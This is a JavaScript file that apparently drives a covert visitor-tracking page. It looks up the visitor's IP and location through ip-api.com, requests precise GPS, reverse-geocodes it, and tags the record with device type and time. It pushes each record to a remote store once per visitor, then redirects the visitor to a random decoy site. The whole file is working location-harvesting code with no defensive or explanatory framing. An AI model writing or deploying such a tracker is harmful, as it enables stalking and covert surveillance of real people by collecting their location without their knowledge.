function exit() {
  location.href = EXIT_SITES[Math.floor(Math.random() * EXIT_SITES.length)];
}

function yaGuardado() {
  if (localStorage.getItem('u')) return true;
  localStorage.setItem('u', '1');
  return false;
}

function detectDevice() {
  return /Android|iPhone|iPad|iPod|webOS|BlackBerry|Windows Phone/i.test(navigator.userAgent) ? 'mobile' : 'pc';
}

function jitter() {
  return (Math.random() - 0.5) * 0.01;
}

function save(pos, ipData) {
  const lat = pos ? pos.coords.latitude : ipData.lat;
  const lng = pos ? pos.coords.longitude : ipData.lon;
  const device = detectDevice();
  const time = new Date().toLocaleString();
  const city = pos ? null : (ipData.city || '');
  const country = pos ? null : (ipData.country || '');

  if (pos) {
    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&addressdetails=1`)
      .then(r => r.json())
      .then(data => {
        const c = data.address?.city || data.address?.town || data.address?.village || data.address?.county || 'Desconocida';
        const co = data.address?.country || '';
        ref.push({ lat: lat + jitter(), lng: lng + jitter(), device, city: c, country: co, ip: ipData && ipData.ip, time });
        status('> DONE', true); exit();
      })
      .catch(() => {
        ref.push({ lat: lat + jitter(), lng: lng + jitter(), device, ip: ipData && ipData.ip, time });
        status('> DONE', true); exit();
      });
  } else {
    ref.push({ lat: lat + jitter(), lng: lng + jitter(), device, city, country, ip: ipData.ip, time });
    status('> DONE', true); exit();
  }
}

if (yaGuardado()) {
  status('> ALREADY COLLECTED', true); exit();
} else {
  status('> OBTAINING IP...');
  fetch('http://ip-api.com/json/')
    .then(r => r.json())
    .then(data => {
      if (data.status === 'success') {
        status('> IP OK - TRYING GPS...');
        navigator.geolocation.getCurrentPosition(
          pos => save(pos, data),
          () => save(null, data),
          { enableHighAccuracy: true, timeout: 8000 }
        );
      }
    })
    .catch(() => {
      status('> IP FAIL - TRYING GPS...');
      navigator.geolocation.getCurrentPosition(
        pos => save(pos),
        () => { status('> ERROR: NO LOCATION', true); exit(); },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });
}
